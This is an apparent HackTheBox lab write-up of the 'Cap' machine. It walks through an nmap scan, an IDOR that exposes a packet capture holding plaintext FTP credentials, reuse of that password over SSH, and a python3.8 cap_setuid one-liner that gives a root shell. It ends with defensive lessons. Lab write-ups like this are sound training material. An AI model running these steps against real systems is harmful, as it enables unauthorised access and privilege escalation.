---
title: Cap - An Easy Linux Machine
type: docs
prev: docs/labs/
next: /
---

> Cap is a **very easy difficulty** Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.

---
# Enumeration

As always, I started with an nmap scan to look for open ports. 

```go {filename="Kali Linux Terminal"}
┌──(kali㉿kali)-[~/Downloads/Cap]
└─$ sudo nmap -sV -sC -oA ~/Downloads/Cap/nmap-scan -v 10.129.16.75
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-03 12:51 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:51
Completed NSE at 12:51, 0.00s elapsed
Initiating NSE at 12:51
Completed NSE at 12:51, 0.00s elapsed
Initiating NSE at 12:51
Completed NSE at 12:51, 0.00s elapsed
Initiating Ping Scan at 12:51
Scanning 10.129.16.75 [4 ports]
Completed Ping Scan at 12:51, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:51
Completed Parallel DNS resolution of 1 host. at 12:51, 0.00s elapsed
Initiating SYN Stealth Scan at 12:51
Scanning 10.129.16.75 [1000 ports]
Discovered open port 80/tcp on 10.129.16.75
Discovered open port 21/tcp on 10.129.16.75
Discovered open port 22/tcp on 10.129.16.75
Completed SYN Stealth Scan at 12:51, 5.33s elapsed (1000 total ports)
Initiating Service scan at 12:51
Scanning 3 services on 10.129.16.75
Completed Service scan at 12:51, 6.20s elapsed (3 services on 1 host)
NSE: Script scanning 10.129.16.75.
Initiating NSE at 12:51
Completed NSE at 12:51, 6.54s elapsed
Initiating NSE at 12:51
Completed NSE at 12:51, 1.70s elapsed
Initiating NSE at 12:51
Completed NSE at 12:51, 0.00s elapsed
Nmap scan report for 10.129.16.75
Host is up (1.8s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 12:51
Completed NSE at 12:51, 0.00s elapsed
Initiating NSE at 12:51
Completed NSE at 12:51, 0.00s elapsed
Initiating NSE at 12:51
Completed NSE at 12:51, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.04 seconds
           Raw packets sent: 1152 (50.664KB) | Rcvd: 1151 (46.040KB)

```

Looks like Port 21, Port 22, and Port 80 are open. Let's try logging into FTP with Anonymous. 

```go {filename="Kali Linux Terminal"}
┌──(kali㉿kali)-[~/Downloads/Cap]
└─$ ftp 10.129.16.75
Connected to 10.129.16.75.
220 (vsFTPd 3.0.3)
Name (10.129.16.75:kali): anonymous  
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> quit
221 Goodbye.
```

I figured it wouldn't work, but worth a try. Since 80/tcp is open, lets load the webpage in a browser to see what this site is about. 

![Security Dashboard Snapshot](/media/cap/security-dashboard.jpg)

The address brought me to a "Security Dashboard", but didn't prompt me to login. 
Username is "Nathan" and there are only 3 navigational options via the left-hand menu: Security Snapshot, IP Config, and Network Status. 

Decided to check out the "Security Snapshot" and it initially brought me here. 

![Security Snapshot Init](/media/cap/security-snapshot-init.jpg)

Looks like traffic activity logs, and there's even a convenient little "Download" button for anyone who's nosy. 

Nathan's probably going to get in trouble after this. 

I also noticed that the URL was appended with "data/1" - so I decided to enter a few different numbers to see if I could load different pages. 

![Security Snapshot Zero Page](/media/cap/security-snapshot-found.jpg)

Every number, except "0" brought me back to the dashboard - and it looks like page zero has some data. 

Let's download it and see what we got.

![PCAP File](/media/cap/pcap-file-init.jpg)

At first, it just seems like typical HTTP, just fetching page contents, but when you scroll down - it looks like our boy Nathan logged into FTP.

![Nathan's Logins](/media/cap/nathan-logins.jpg)

So let's try that FTP login again, but this time with Nathan's password.

```Go {filename="Kali Linux Terminal"}
┌──(kali㉿kali)-[~/Downloads/Cap]
└─$ ftp nathan@10.129.16.75
Connected to 10.129.16.75.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||63233|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Feb 03 17:39 user.txt
226 Directory send OK.
ftp> get user.txt -
remote: user.txt
229 Entering Extended Passive Mode (|||7361|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
3e58229aeb9fe1659337fafc661eac38
226 Transfer complete.
33 bytes received in 00:00 (0.17 KiB/s)
ftp> 
```

Found our first flag - thanks Nathan!

Now, port 22 was also open, but there's no way Nathan would reuse his password...right?

```Go {filename="Kali Linux Terminal"}
┌──(kali㉿kali)-[~/Downloads/Cap]
└─$ ssh nathan@10.129.16.75
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
nathan@10.129.16.75's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Feb  3 18:44:12 UTC 2026

  System load:           0.0
  Usage of /:            36.7% of 8.73GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             224
  Users logged in:       0
  IPv4 address for eth0: 10.129.16.75
  IPv6 address for eth0: dead:beef::250:56ff:feb0:32ae

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Feb  3 18:41:18 2026 from 10.10.17.162
nathan@cap:~$ ls
user.txt
nathan@cap:~$ cat user.txt
3e58229aeb9fe1659337fafc661eac38
nathan@cap:~$ 
```

And as expected, we found the same `user.txt` - which tells me it's time for the "privilege escalation" part of this challenge.'

# Exploitation

I had to stop and do a bit of education on privilege escalation, and from what I found - we're looking for a binary python file with `setuid` inside.

```Go {filename="Kali Linux Terminal"}
nathan@cap:~$ find / -perm -4000 2>/dev/null
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/chsh
/usr/bin/su
/usr/bin/fusermount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/snap/snapd/11841/usr/lib/snapd/snap-confine
/snap/snapd/12398/usr/lib/snapd/snap-confine
/snap/core18/2066/bin/mount
/snap/core18/2066/bin/ping
/snap/core18/2066/bin/su
/snap/core18/2066/bin/umount
/snap/core18/2066/usr/bin/chfn
/snap/core18/2066/usr/bin/chsh
/snap/core18/2066/usr/bin/gpasswd
/snap/core18/2066/usr/bin/newgrp
/snap/core18/2066/usr/bin/passwd
/snap/core18/2066/usr/bin/sudo
/snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2066/usr/lib/openssh/ssh-keysign
/snap/core18/2074/bin/mount
/snap/core18/2074/bin/ping
/snap/core18/2074/bin/su
/snap/core18/2074/bin/umount
/snap/core18/2074/usr/bin/chfn
/snap/core18/2074/usr/bin/chsh
/snap/core18/2074/usr/bin/gpasswd
/snap/core18/2074/usr/bin/newgrp
/snap/core18/2074/usr/bin/passwd
/snap/core18/2074/usr/bin/sudo
/snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2074/usr/lib/openssh/ssh-keysign
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

```

After running `getcap -r / 2>/dev/null` - we found our target file: `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip` 

A bit more research helped me build a basic python script to execute the escalation.

```Go {filename="Kali Linux Terminal"}
nathan@cap:~$ /usr/bin/python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"
root@cap:~# whoami
root
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
root@cap:~# cd /root
root@cap:/root# ls
root.txt  snap
root@cap:/root# cat root.txt
b9d943cb225a1303739cbd1f59ba7f36
```

Worked like a charm. 

I quickly double-checked my privileges, then searched the directory and found `root.txt`

![Completion Proof](/media/cap/solved.jpg)

First HacktheBox challenge complete.

## Reflection: What I Learned from Cap

Cap was my first retired HackTheBox machine, and it was a perfect "very easy" introduction to real-world pentesting concepts. Here's what stuck with me the most:

- **Enumeration is everything** — Almost the entire box was solved during recon. Nmap gave me the ports, browsing the web app revealed the dashboard and IDOR pattern, and Wireshark on the downloaded PCAP exposed the plaintext credentials. Skipping deep enumeration would have left me stuck.

- **IDOR vulnerabilities are sneaky and common** — Changing a number in the URL (`/data/1` → `/data/0`) gave access to another user's data. Always test numeric IDs, GUIDs, or parameters for direct object access — never trust client-side restrictions.

- **Plaintext protocols are dangerous** — FTP sent the password in clear text, which Wireshark captured easily. This is why modern services push SFTP/SCP/SSH for file transfers and never use FTP in production anymore.

- **Credential reuse is a killer** — Nathan used the same password for FTP and SSH. One leak = full access. In real life, this is extremely common — always use unique, strong passwords per service (and ideally a password manager).

- **Linux capabilities can be just as dangerous as SUID** — I initially looked for SUID binaries with `find -perm -4000`, but the real vuln was a capability misconfiguration on `python3.8`. The `getcap -r /` command taught me to check for these too. `cap_setuid` let a regular user become root via a simple Python one-liner — powerful stuff.

- **Recursion matters** — Commands like `getcap -r /` and `find / -perm -4000` use the `-r` flag to search the entire filesystem recursively. Without it, I'd never have found the misconfigured Python binary buried in `/usr/bin/`.

- **Patience and small steps win** — I got stuck a few times (quoting issues in the Python exploit, understanding what "recursive" meant), but breaking it down, searching GTFOBins, and asking questions helped me push through. First-box nerves are real, but finishing one builds huge confidence.

Overall, Cap taught me that most boxes aren't solved by fancy exploits — they're solved by **thorough enumeration**, **spotting misconfigurations**, and **connecting the dots**. Excited (and a little less intimidated) for the next one!